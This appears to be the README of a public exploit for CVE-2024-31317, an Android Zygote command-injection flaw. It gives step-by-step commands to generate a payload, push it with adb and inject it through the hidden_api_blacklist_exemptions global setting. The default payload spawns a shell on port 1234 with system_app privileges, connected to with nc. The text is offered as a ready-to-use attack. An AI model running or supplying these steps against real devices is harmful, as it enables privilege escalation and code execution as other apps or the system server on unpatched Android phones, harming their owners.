# Zygote Injection (CVE-2024-31317)

This is an exploit for CVE-2024-31317. It allows passing arbitrary commands to the zygote process.
This effectively allows running as any other app or system server under any selinux policy we want.
The only restriction is zygote does not luanch processess as root.

This exploit is tested on android 12 ingots2 image.

Based on: https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html

## Using Exploit

Adjust the arguments you want to send to zygote in `payload.py` in the `args` variable.

Then run:
```sh
python payload.py
```

To generate a file called payload which contains a settings value which will cause command injection.


Use adb to push the payload to the device:
```sh
adb push payload /data/local/tmp
```

Then trigger the command injection exploit:
```sh
settings put global hidden_api_blacklist_exemptions "$(cat /data/local/tmp/payload)"                                                                                                               
```


The default arguments spawn a shell listening on port 1234 running as a `system_app` uid and selinux context.

Connect to the shell using the command:
```sh
nc localhost 1234
```
